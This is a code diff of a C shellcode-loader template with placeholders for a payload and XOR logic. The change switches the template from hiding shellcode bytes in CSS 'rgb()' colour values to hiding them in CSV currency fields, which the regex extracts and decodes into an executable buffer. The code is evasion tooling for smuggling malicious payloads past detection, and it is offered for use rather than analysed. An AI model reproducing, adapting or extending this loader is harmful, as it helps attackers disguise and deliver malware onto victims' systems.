@@ -7,7 +7,7 @@
 
 ###PAYLOAD###
 
-struct cssdata
+struct csvdata
 {
     unsigned char* shellcode;
     int size;
@@ -29,7 +29,7 @@ char *strremove(char *str, const char *sub)
     return str;
 }
 
-struct cssdata * GetShellcodeFromCSS()
+struct csvdata * GetShellcodeFromCSV()
 {
   int sz = sizeof(payload) / sizeof(payload[0]);
   int holder[sz];
@@ -66,7 +66,7 @@ struct cssdata * GetShellcodeFromCSS()
 
     find_all = 1;
 
-    pattern = (PCRE2_SPTR)"rgb\\((\\d{1,3}),";
+    pattern = (PCRE2_SPTR)",\"\\$.{0,10}, \"\\$(\\d{1,3})";
     subject = (PCRE2_SPTR)payload[line];
     subject_length = strlen((char *)subject);
 
@@ -173,9 +173,8 @@ struct cssdata * GetShellcodeFromCSS()
       }
     }
 
-    // remove the "rgb bit"
-    strremove(temp, "rgb(");
-    strremove(temp, ",");
+    // remove the final thousands count"
+    strremove(temp, ",000\"");
 
     int intVal = atoi(temp);
 
@@ -198,7 +197,7 @@ struct cssdata * GetShellcodeFromCSS()
 
     ###XOR_LOGIC###
 
-    struct cssdata* d = malloc(sizeof(struct cssdata));
+    struct csvdata* d = malloc(sizeof(struct csvdata));
     d->shellcode = malloc(count);
     memcpy(d->shellcode, shellcode, count);
     d->size = count;
